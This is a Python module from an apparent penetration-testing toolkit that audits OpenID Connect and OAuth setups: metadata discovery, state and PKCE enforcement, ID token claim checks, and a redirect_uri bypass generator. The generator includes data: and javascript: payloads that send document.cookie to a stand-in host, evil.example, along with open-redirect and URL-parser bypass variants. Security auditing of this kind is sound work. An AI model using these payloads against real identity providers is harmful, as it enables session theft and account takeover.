#!/usr/bin/env python3
"""
redshift_toolkit.web.oauth_flow_analyzer — OpenID Connect / OAuth 2.0 audit.

Capabilities
------------
1.  Fetch ``.well-known/openid-configuration`` and validate required endpoints
    (authorization, token, jwks_uri, userinfo, issuer).

2.  ``redirect_uri`` bypass matrix — for each base redirect_uri the user
    supplies, generate the canonical bypass variants and emit them as a
    catalogue. The script does not actually redirect a victim — it only
    produces the URLs you can click to test, plus the parsed response. Test
    ideas implemented:

        path traversal, suffix match, fragment, port, scheme, userinfo,
        encoded slash, dot-segment, querystring smuggle, parser-differential.

3.  ``state`` + ``PKCE`` requirements — call /authorize with no state, no
    code_challenge, and check whether the IdP actually rejects.

4.  ID token claim audit — when given a sample ID token (JWT), validate
    iss / aud / sub / email_verified / exp / iat / nonce.

Usage
-----
    # Discovery audit
    python3 -m redshift_toolkit.web.oauth_flow_analyzer \\
        --discover https://idp.example.com

    # redirect_uri bypass catalogue
    python3 -m redshift_toolkit.web.oauth_flow_analyzer \\
        --discover https://idp.example.com \\
        --client-id abc123 \\
        --redirect-uri https://app.example.com/cb \\
        --bypass-matrix

    # ID token audit
    python3 -m redshift_toolkit.web.oauth_flow_analyzer \\
        --id-token eyJhbGciOi... --expected-iss https://idp.example.com \\
        --expected-aud abc123

Author: Redshift Project — Module 17 (Auth & AuthZ)
License: MIT — authorised testing only.
"""
from __future__ import annotations

import argparse
import base64
import json
import sys
import time
from dataclasses import asdict, dataclass, field
from typing import Any, Dict, List, Optional
from urllib.parse import quote, urlencode, urlparse

from .http_client import HttpRequest, send


GREEN, RED, YELLOW, CYAN, GREY, BOLD, RESET = (
    "\x1b[32m", "\x1b[31m", "\x1b[33m", "\x1b[36m", "\x1b[90m", "\x1b[1m", "\x1b[0m",
)


def paint(t: str, c: str, *, enabled: bool = True) -> str:
    return f"{c}{t}{RESET}" if enabled else t


# ---------------------------------------------------------------------------
# .well-known discovery
# ---------------------------------------------------------------------------
REQUIRED_FIELDS = [
    "issuer", "authorization_endpoint", "token_endpoint",
    "jwks_uri", "response_types_supported", "subject_types_supported",
    "id_token_signing_alg_values_supported",
]

RECOMMENDED_FIELDS = [
    "userinfo_endpoint", "registration_endpoint", "scopes_supported",
    "code_challenge_methods_supported", "introspection_endpoint",
    "revocation_endpoint",
]


@dataclass
class DiscoveryResult:
    url: str
    raw: Dict[str, Any] = field(default_factory=dict)
    missing_required: List[str] = field(default_factory=list)
    missing_recommended: List[str] = field(default_factory=list)
    issues: List[str] = field(default_factory=list)


def discover(idp_base: str, *, timeout: float = 10.0) -> DiscoveryResult:
    url = idp_base.rstrip("/") + "/.well-known/openid-configuration"
    res = DiscoveryResult(url=url)
    try:
        req = HttpRequest(method="GET", url=url)
        resp = send(req, timeout=timeout)
        if resp.status != 200:
            res.issues.append(f"non-200 status: {resp.status}")
            return res
        data = json.loads((resp.body or b"").decode("utf-8", errors="replace"))
        res.raw = data
    except Exception as e:
        res.issues.append(f"discovery fetch failed: {e}")
        return res

    for f in REQUIRED_FIELDS:
        if f not in data:
            res.missing_required.append(f)
    for f in RECOMMENDED_FIELDS:
        if f not in data:
            res.missing_recommended.append(f)

    # Audit-style checks
    algs = data.get("id_token_signing_alg_values_supported", [])
    if "none" in [a.lower() for a in algs]:
        res.issues.append("alg=none accepted in id_token_signing_alg_values_supported (RFC 8725 §3.1)")
    if "HS256" in algs and "RS256" in algs:
        res.issues.append("both HS256 and RS256 accepted — confusion risk if jwks_uri is reused as HMAC key")
    if "code_challenge_methods_supported" in data:
        if "plain" in data["code_challenge_methods_supported"]:
            res.issues.append("PKCE 'plain' challenge accepted — only S256 should be allowed (RFC 7636 §4.2)")
    else:
        res.issues.append("PKCE not advertised in metadata")

    iss = data.get("issuer", "")
    if iss and not iss.startswith("https://"):
        res.issues.append(f"issuer is not https://: {iss}")

    return res


# ---------------------------------------------------------------------------
# redirect_uri bypass matrix
# ---------------------------------------------------------------------------
def redirect_bypass_variants(base_redirect: str, attacker_host: str = "evil.example") -> List[Dict[str, str]]:
    """Generate redirect_uri permutations to try against /authorize."""
    parsed = urlparse(base_redirect)
    scheme = parsed.scheme or "https"
    netloc = parsed.netloc
    path = parsed.path or "/"

    variants = [
        ("path traversal",          f"{scheme}://{netloc}{path}/../{attacker_host}"),
        ("path traversal (enc)",    f"{scheme}://{netloc}{path}%2F..%2F{attacker_host}"),
        ("suffix match",            f"{scheme}://{netloc}.{attacker_host}{path}"),
        ("prefix attacker",         f"{scheme}://{attacker_host}.{netloc}{path}"),
        ("fragment smuggle",        f"{scheme}://{netloc}{path}#@{attacker_host}/"),
        ("@-userinfo",              f"{scheme}://{netloc}@{attacker_host}{path}"),
        ("question-mark smuggle",   f"{scheme}://{attacker_host}?@{netloc}{path}"),
        ("backslash differential",  f"{scheme}://{netloc}\\@{attacker_host}{path}"),
        ("port confusion",          f"{scheme}://{netloc}:80@{attacker_host}{path}"),
        ("scheme downgrade",        f"http://{netloc}{path}"),
        ("scheme exotic (data:)",   f"data:text/html,<script>fetch('https://{attacker_host}?'+document.cookie)</script>"),
        ("scheme exotic (jav.)",    f"javascript:fetch('https://{attacker_host}?'+document.cookie)"),
        ("encoded null",            f"{scheme}://{netloc}%00.{attacker_host}{path}"),
        ("triple-slash",            f"{scheme}:///{attacker_host}{path}"),
        ("exact + open redirect",   f"{base_redirect}?next=https://{attacker_host}/"),
    ]
    return [{"label": l, "redirect_uri": v} for l, v in variants]


def build_authorize_urls(authz_endpoint: str, client_id: str,
                         variants: List[Dict[str, str]],
                         scope: str = "openid email profile",
                         response_type: str = "code") -> List[Dict[str, str]]:
    out = []
    for v in variants:
        params = {
            "client_id": client_id,
            "redirect_uri": v["redirect_uri"],
            "response_type": response_type,
            "scope": scope,
            "state": "redshift-test",
        }
        url = authz_endpoint + ("&" if "?" in authz_endpoint else "?") + urlencode(params, quote_via=quote)
        out.append({"label": v["label"], "redirect_uri": v["redirect_uri"], "url": url})
    return out


# ---------------------------------------------------------------------------
# state / PKCE enforcement
# ---------------------------------------------------------------------------
def test_state_enforcement(authz_endpoint: str, client_id: str,
                           redirect_uri: str, *, timeout: float = 10.0) -> Dict[str, Any]:
    params = {
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "response_type": "code",
        "scope": "openid",
        # NOTE: no state parameter
    }
    url = authz_endpoint + ("&" if "?" in authz_endpoint else "?") + urlencode(params)
    try:
        resp = send(HttpRequest(method="GET", url=url), timeout=timeout, follow_redirects=False)
        return {
            "test": "no state parameter",
            "status": resp.status,
            "location": resp.get_header("location") or "",
            "interpretation":
                "IdP should reject (400) or warn — leaving state optional enables CSRF on the callback.",
        }
    except Exception as e:
        return {"test": "no state parameter", "error": str(e)}


def test_pkce_enforcement(authz_endpoint: str, client_id: str,
                          redirect_uri: str, *, timeout: float = 10.0) -> Dict[str, Any]:
    params = {
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "response_type": "code",
        "scope": "openid",
        "state": "redshift-pkce-test",
        # no code_challenge
    }
    url = authz_endpoint + ("&" if "?" in authz_endpoint else "?") + urlencode(params)
    try:
        resp = send(HttpRequest(method="GET", url=url), timeout=timeout, follow_redirects=False)
        return {
            "test": "no PKCE",
            "status": resp.status,
            "location": resp.get_header("location") or "",
            "interpretation":
                "Public clients (mobile / SPA) MUST be rejected when PKCE is missing (RFC 9700 §2.1.1).",
        }
    except Exception as e:
        return {"test": "no PKCE", "error": str(e)}


# ---------------------------------------------------------------------------
# ID token audit
# ---------------------------------------------------------------------------
def b64url_decode(seg: str) -> bytes:
    seg += "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg)


def audit_id_token(token: str, *, expected_iss: Optional[str] = None,
                   expected_aud: Optional[str] = None,
                   expected_nonce: Optional[str] = None) -> Dict[str, Any]:
    parts = token.split(".")
    out: Dict[str, Any] = {"issues": []}
    if len(parts) != 3:
        out["issues"].append("not a 3-segment JWT")
        return out

    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception as e:
        out["issues"].append(f"failed to decode JWT: {e}")
        return out

    out["header"] = header
    out["payload"] = payload

    alg = (header.get("alg") or "").lower()
    if alg == "none":
        out["issues"].append("CRITICAL: alg=none accepted (token is unsigned)")
    if alg.startswith("hs"):
        out["issues"].append("HMAC algorithm — verify the key is not the JWKS public key (RS→HS confusion)")
    if "kid" in header and any(c in header["kid"] for c in ("/", "\\", "..")):
        out["issues"].append("kid contains path separators — possible key-injection / SQL injection")

    if expected_iss and payload.get("iss") != expected_iss:
        out["issues"].append(f"iss mismatch: got {payload.get('iss')!r}, expected {expected_iss!r}")
    if expected_aud:
        aud = payload.get("aud")
        if isinstance(aud, list):
            if expected_aud not in aud:
                out["issues"].append(f"aud mismatch: {aud} does not contain {expected_aud!r}")
        elif aud != expected_aud:
            out["issues"].append(f"aud mismatch: got {aud!r}")
    if expected_nonce and payload.get("nonce") != expected_nonce:
        out["issues"].append(f"nonce mismatch: got {payload.get('nonce')!r}")

    now = int(time.time())
    exp = payload.get("exp")
    if exp is None:
        out["issues"].append("no exp claim — token never expires")
    elif isinstance(exp, (int, float)) and exp < now:
        out["issues"].append(f"token expired ({now - int(exp)}s ago)")
    iat = payload.get("iat")
    if iat is None:
        out["issues"].append("no iat claim")

    if "email" in payload and not payload.get("email_verified"):
        out["issues"].append("email present but email_verified is false/missing — do NOT use as account identifier")

    return out


# ---------------------------------------------------------------------------
# Reporting
# ---------------------------------------------------------------------------
def report(disc: Optional[DiscoveryResult],
           bypass_urls: Optional[List[Dict[str, str]]],
           state_test: Optional[Dict[str, Any]],
           pkce_test: Optional[Dict[str, Any]],
           id_audit: Optional[Dict[str, Any]],
           *, colour: bool = True) -> str:
    L: List[str] = []
    if disc is not None:
        L.append(paint(f"\n[discovery] {disc.url}", BOLD, enabled=colour))
        if disc.missing_required:
            L.append(paint(f"  missing required: {', '.join(disc.missing_required)}", RED, enabled=colour))
        if disc.missing_recommended:
            L.append(paint(f"  missing recommended: {', '.join(disc.missing_recommended)}", YELLOW, enabled=colour))
        for issue in disc.issues:
            L.append(paint(f"  ! {issue}", YELLOW, enabled=colour))
        if not (disc.missing_required or disc.issues):
            L.append(paint("  metadata looks reasonable", GREEN, enabled=colour))

    if bypass_urls:
        L.append(paint(f"\n[redirect_uri bypass matrix] {len(bypass_urls)} URLs to manually test:", BOLD, enabled=colour))
        for v in bypass_urls:
            L.append(f"  {paint(v['label'], CYAN, enabled=colour):28s}  {v['url']}")

    if state_test:
        L.append(paint("\n[state enforcement]", BOLD, enabled=colour))
        L.append(f"  status={state_test.get('status')}")
        if state_test.get('location'):
            L.append(f"  location={state_test['location'][:120]}")
        if 'interpretation' in state_test:
            L.append(f"  {paint(state_test['interpretation'], GREY, enabled=colour)}")

    if pkce_test:
        L.append(paint("\n[PKCE enforcement]", BOLD, enabled=colour))
        L.append(f"  status={pkce_test.get('status')}")
        if pkce_test.get('location'):
            L.append(f"  location={pkce_test['location'][:120]}")
        if 'interpretation' in pkce_test:
            L.append(f"  {paint(pkce_test['interpretation'], GREY, enabled=colour)}")

    if id_audit is not None:
        L.append(paint("\n[id_token audit]", BOLD, enabled=colour))
        L.append(f"  alg={id_audit.get('header', {}).get('alg')}  kid={id_audit.get('header', {}).get('kid')}")
        for issue in id_audit.get("issues", []):
            sev = RED if issue.startswith("CRITICAL") else YELLOW
            L.append(paint(f"  ! {issue}", sev, enabled=colour))
        if not id_audit.get("issues"):
            L.append(paint("  no obvious issues", GREEN, enabled=colour))

    return "\n".join(L)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main(argv: Optional[List[str]] = None) -> int:
    p = argparse.ArgumentParser(prog="oauth_flow_analyzer",
                                description="OpenID Connect / OAuth 2.0 audit.")
    p.add_argument("--discover", help="IdP base URL — fetches /.well-known/openid-configuration")
    p.add_argument("--client-id")
    p.add_argument("--redirect-uri")
    p.add_argument("--attacker-host", default="evil.example")
    p.add_argument("--bypass-matrix", action="store_true",
                   help="emit redirect_uri bypass URLs for /authorize")
    p.add_argument("--test-state", action="store_true")
    p.add_argument("--test-pkce", action="store_true")
    p.add_argument("--id-token", help="audit a JWT id_token (paste raw)")
    p.add_argument("--expected-iss")
    p.add_argument("--expected-aud")
    p.add_argument("--expected-nonce")
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--format", choices=["text", "json"], default="text")
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args(argv)

    disc = discover(args.discover, timeout=args.timeout) if args.discover else None
    authz = (disc.raw.get("authorization_endpoint") if disc else None)

    bypass_urls: Optional[List[Dict[str, str]]] = None
    if args.bypass_matrix and authz and args.client_id and args.redirect_uri:
        variants = redirect_bypass_variants(args.redirect_uri, args.attacker_host)
        bypass_urls = build_authorize_urls(authz, args.client_id, variants)

    state_test = None
    if args.test_state and authz and args.client_id and args.redirect_uri:
        state_test = test_state_enforcement(authz, args.client_id, args.redirect_uri,
                                            timeout=args.timeout)
    pkce_test = None
    if args.test_pkce and authz and args.client_id and args.redirect_uri:
        pkce_test = test_pkce_enforcement(authz, args.client_id, args.redirect_uri,
                                          timeout=args.timeout)

    id_audit = None
    if args.id_token:
        id_audit = audit_id_token(args.id_token,
                                  expected_iss=args.expected_iss,
                                  expected_aud=args.expected_aud,
                                  expected_nonce=args.expected_nonce)

    if args.format == "json":
        out: Dict[str, Any] = {}
        if disc is not None:
            out["discovery"] = asdict(disc)
        if bypass_urls is not None:
            out["redirect_bypass_urls"] = bypass_urls
        if state_test is not None:
            out["state_test"] = state_test
        if pkce_test is not None:
            out["pkce_test"] = pkce_test
        if id_audit is not None:
            out["id_token_audit"] = id_audit
        print(json.dumps(out, indent=2, default=str))
    else:
        print(report(disc, bypass_urls, state_test, pkce_test, id_audit,
                     colour=not args.no_color))

    bad = False
    if disc and (disc.missing_required or disc.issues):
        bad = True
    if id_audit and id_audit.get("issues"):
        bad = True
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
